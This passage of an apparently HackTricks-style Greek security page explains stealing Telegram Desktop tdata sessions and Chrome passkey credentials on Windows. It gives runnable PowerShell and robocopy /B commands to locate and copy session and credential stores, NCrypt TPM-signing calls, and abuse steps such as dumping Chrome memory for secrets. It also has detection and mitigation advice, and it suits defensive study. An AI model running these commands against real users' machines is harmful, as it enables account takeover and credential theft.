Στην πλευρά του χειριστή, αναδημιουργήστε το αρχείο και εκτελέστε το dumper τοπικά για να ανακτήσετε διαπιστευτήρια:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Κλοπή συνεδρίας `tdata` του Telegram Desktop

Το Telegram Desktop αποθηκεύει τα δεδομένα εξουσιοδότησης και κατάστασης λογαριασμού στον κατάλογό του **`tdata`**. Μια αντιγραμμένη συνεδρία μπορεί να φορτωθεί με συμβατά εργαλεία, ώστε να γίνει ταυτοποίηση χωρίς τον κωδικό πρόσβασης του λογαριασμού, όσο η εξουσιοδότηση παραμένει έγκυρη· αν είναι ενεργοποιημένη η κρυπτογράφηση των τοπικών δεδομένων, ο stealer χρειάζεται επίσης τον κωδικό πρόσβασης. Μια ταυτοποιημένη συνεδρία μπορεί στη συνέχεια να αποκαλύψει δεδομένα ταυτότητας, μεταδεδομένα συνομιλιών και συμμετοχής, μηνύματα και πολυμέσα προς λήψη.<sup>[[10]](#references)</sup>

### Εντοπισμός και απόκτηση

Αναζητήστε τόσο εγκατεστημένες όσο και φορητές διατάξεις· τα ονόματα των πακέτων του Microsoft Store ποικίλλουν, επομένως απαριθμήστε τους καταλόγους πακέτων που περιέχουν `TelegramMessenge` και εξετάστε το υποδέντρο `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Αν οι συνηθισμένες αναγνώσεις αποτύχουν και το token της διεργασίας **περιέχει ήδη και έχει ενεργοποιημένο** το `SeBackupPrivilege`, η πρόσβαση με backup-aware λειτουργία αποτελεί εναλλακτική λύση· δεν αποκτά το προνόμιο ούτε αναβαθμίζει τα δικαιώματα της διεργασίας. Η `CreateFileW` με `FILE_FLAG_BACKUP_SEMANTICS` μπορεί να ζητήσει σημασιολογία backup/restore και να παρακάμψει τους ελέγχους ασφαλείας αρχείων, όταν υπάρχουν τα απαιτούμενα προνόμια στο token, αλλά η σημαία από μόνη της δεν παρακάμπτει ένα ασύμβατο sharing lock.<sup>[[10]](#references)[[11]](#references)</sup>

Για αρχεία που είναι κλειδωμένα ενώ χρησιμοποιούνται, δημιουργήστε/διαβάστε ένα **Volume Shadow Copy**· για αρχεία στα οποία η πρόσβαση εμποδίζεται από ACL, το `robocopy /B` χρησιμοποιεί λειτουργία backup και παρακάμπτει τα ACL αρχείων και καταλόγων.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Ένα implant που λαμβάνει υπόψη το διαθέσιμο bandwidth μπορεί αρχικά να υποβάλει μόνο το ευρετήριο διαδρομών αρχείων, να λάβει ένα αναγνωριστικό snapshot μαζί με τις διαδρομές που είναι ήδη αποθηκευμένες στο C2 και να ανεβάσει μόνο τα αρχεία που λείπουν. Επομένως, μικρές incremental μεταφορές μετά από recursive απαρίθμηση του `tdata` μπορεί και πάλι να υποδηλώνουν επιτυχή κλοπή session.<sup>[[10]](#references)</sup>

### Ανίχνευση και περιορισμός

Συσχετίστε recursive πρόσβαση στο `tdata` από διεργασία που δεν είναι Telegram με ενεργοποίηση του `SeBackupPrivilege`, άνοιγμα αρχείων με backup semantics, δραστηριότητα VSS ή θυγατρική διεργασία `robocopy.exe` που χρησιμοποιεί το `/B`. Επίσης, αναζητήστε ταχεία απαρίθμηση τόσο του `%APPDATA%` όσο και του `%LOCALAPPDATA%\Packages`, ακολουθούμενη από εξερχόμενες συνδέσεις από την ίδια διεργασία. Μετά την παραβίαση, χρησιμοποιήστε τις **Ρυθμίσεις → Συσκευές** (ή **Απόρρητο και ασφάλεια → Ενεργές συνεδρίες**) για να τερματίσετε μη αναγνωρισμένες συνεδρίες· η ενεργοποίηση της επαλήθευσης σε δύο βήματα από μόνη της δεν ανακαλεί μια εξουσιοδότηση που έχει ήδη κλαπεί.<sup>[[10]](#references)[[13]](#references)</sup>

## Κλοπή διαπιστευτηρίων Passkeys / WebAuthn από το Chrome στα Windows

Αν αποκτηθεί εκτέλεση κώδικα ως **ο χρήστης-θύμα** σε έναν host Windows που χρησιμοποιεί **Chrome + passkeys συγχρονισμένα μέσω του Google Password Manager**, τα passkeys γίνονται ενδιαφέρων στόχος για post-exploitation ακόμη και **χωρίς admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Ενδιαφέροντα τοπικά τεχνουργήματα

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** αποθηκεύει εγγραφές **`WebauthnCredentialSpecifics`** κωδικοποιημένες σε protobuf. Μια διεργασία του ίδιου χρήστη μπορεί να απαριθμήσει το **RP ID**, το **όνομα χρήστη**, το **credential ID** και το κρυπτογραφημένο υλικό ιδιωτικού κλειδιού για συγχρονισμένα passkeys.<sup>[[5]](#references)</sup>
- Το **`passkey_enclave_state`** αποθηκεύει την κατάσταση τοπικής εγγραφής συσκευής, όπως το **`wrapped_identity_private_key`** και το περιτυλιγμένο μυστικό που χρησιμοποιείται για την ανάκτηση συγχρονισμένων διαπιστευτηρίων.<sup>[[4]](#references)</sup>

Γρήγορη διαλογή:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Τα TPM-bound key blobs μπορούν και πάλι να χρησιμοποιηθούν ως τοπικό signing oracle

Αν το browser εξαγάγει ένα TPM-backed identity key ως **`NCRYPT_OPAQUE_KEY_BLOB`** και αποθηκεύσει αυτό το blob σε κατάσταση προσβάσιμη από τον χρήστη, το malware **δεν** χρειάζεται να εξαγάγει το ακατέργαστο private key. Μπορεί απλώς να εισαγάγει ξανά το blob στο **ίδιο μηχάνημα** και να ζητήσει από το τοπικό TPM να υπογράψει δεδομένα ελεγχόμενα από τον attacker:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Αυτό σημαίνει ότι το **hardware binding αποτρέπει την εξαγωγή εκτός συσκευής, αλλά όχι τη χρήση από τον ίδιο χρήστη στο παραβιασμένο endpoint**.

### Πρακτικές οδοί κατάχρησης

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Κάντε enumerate τα `WebauthnCredentialSpecifics` από το LevelDB του Chrome.
   - Ξεκινήστε μια σύνδεση με passkey και αποκτήστε ένα νέο WebAuthn challenge.
   - Χρησιμοποιήστε το κλεμμένο blob `wrapped_identity_private_key` στο TPM του θύματος για να υπογράψετε το binding του αιτήματος cloud-authenticator.
   - Προωθήστε το assertion που επιστρέφεται στο relying party.
   - Αυτό είναι ιδιαίτερα χρήσιμο όταν το RP δέχεται `userVerification=preferred` ή δεν απορρίπτει assertions με **`UV=0`**.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - Επιβάλετε νέο onboarding διαγράφοντας το `passkey_enclave_state` ή στέλνοντας μια έγκυρη, υπογεγραμμένη ενέργεια `device/forget`.
   - Αν το onboarding αφήσει τη συσκευή σε κατάσταση **`uv_key_pending`**, καταχωρίστε ένα δημόσιο κλειδί UV που ελέγχει ο επιτιθέμενος.
   - Αν ο provider δεν επαληθεύει το attestation / την προέλευση από secure hardware του νέου κλειδιού UV, οι μεταγενέστερες υπογραφές από το κλειδί του επιτιθέμενου αντιμετωπίζονται ως **`UV=1`**.
3. **Κλοπή ανάκτησης master-secret / SDS**<sup>[[4]](#references)</sup>
   - Επιβάλετε ανάκτηση ή επανένταξη, ώστε το Chrome να ανακτήσει το master secret των synced-passkey.
   - Παρακολουθήστε για αναδημιουργία/τροποποίηση του `passkey_enclave_state` και, στη συνέχεια, κάντε dump τη μνήμη του Chrome όσο το plaintext **security domain secret (SDS)** βρίσκεται στη μνήμη.
   - Χρησιμοποιήστε το SDS που ανακτήθηκε για να αποκρυπτογραφήσετε τα κρυπτογραφημένα πεδία σε κάθε εγγραφή `WebauthnCredentialSpecifics` και να ανακτήσετε φορητά ιδιωτικά κλειδιά WebAuthn.

### Ιδέες για DFIR / ανίχνευση

- Παρακολουθήστε τη **διαγραφή/αναδημιουργία** του `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Ενεργοποιήστε alert για μη φυσιολογική πρόσβαση στο **`Sync Data\LevelDB`** του Chrome από διεργασίες που δεν είναι browser.
- Ενεργοποιήστε alert για **dumps μνήμης του Chrome** ή ύποπτη πρόσβαση στη μνήμη μεταξύ διεργασιών.
- Διερευνήστε επαναλαμβανόμενες προτροπές για **PIN ανάκτησης του Google Password Manager** ή απρόσμενο νέο onboarding.
- Να θυμάστε ότι το WebAuthn **`signCount`** συχνά δεν είναι χρήσιμο για synced passkeys, επειδή μπορεί να παραμένει σταθερό· επομένως, η κλασική ανίχνευση κλώνων είναι αδύναμη.

## References

- [1] [Unit 42 – Διερεύνηση πολυετών, μη εντοπισμένων επιχειρήσεων που στόχευαν τομείς υψηλής αξίας](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing με Word VBA macro μέσω SMTP → αποκρυπτογράφηση διαπιστευτηρίων hMailServer → Veeam CVE-2023-27532 για SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Μέσα στο Ink Dragon: Αποκαλύπτοντας το δίκτυο relay και την εσωτερική λειτουργία μιας μυστικής επιθετικής επιχείρησης](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Μια νέα επιφάνεια επίθεσης στον passwordless έλεγχο ταυτότητας](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / αποθήκευση κλειδιών CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Επιθέσεις σε συστήματα και δίκτυα Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Πώς λειτουργεί πραγματικά το Data Store του Active Directory: Μέσα στο NTDS.dit (Μέρος 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Απομακρυσμένο dump κωδικών πρόσβασης Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Το Armored Likho επεκτείνει το οπλοστάσιο κυβερνοκατασκοπείας του με το toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Η συνάρτηση CreateFileW και το `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Λειτουργία δημιουργίας αντιγράφων ασφαλείας Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Συχνές ερωτήσεις του Telegram – Τερματισμός ενεργών συνεδριών](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
